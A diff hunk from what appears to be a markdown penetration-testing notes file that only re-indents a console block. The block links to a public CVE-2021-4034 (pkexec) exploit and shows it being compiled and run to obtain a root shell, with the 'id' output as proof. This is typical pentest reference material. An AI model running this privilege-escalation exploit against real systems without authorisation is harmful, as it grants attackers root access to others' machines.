@@ -134,12 +134,12 @@
 * [exploit](https://github.com/arthepsy/CVE-2021-4034)
 
   ```console
-rio@pentest:~/Desktop/CVE-2021-4034$ ls
-cve-2021-4034-poc.c  README.md
-rio@pentest:~/Desktop/CVE-2021-4034$ gcc cve-2021-4034-poc.c  -o cve-2021-4034
-rio@pentest:~/Desktop/CVE-2021-4034$ ./cve-2021-4034
-# id
-uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare),136(wireshark),1000(rio)
+  rio@pentest:~/Desktop/CVE-2021-4034$ ls
+  cve-2021-4034-poc.c  README.md
+  rio@pentest:~/Desktop/CVE-2021-4034$ gcc cve-2021-4034-poc.c  -o cve-2021-4034
+  rio@pentest:~/Desktop/CVE-2021-4034$ ./cve-2021-4034
+  # id
+  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare),136(wireshark),1000(rio)
 #
   ```
 
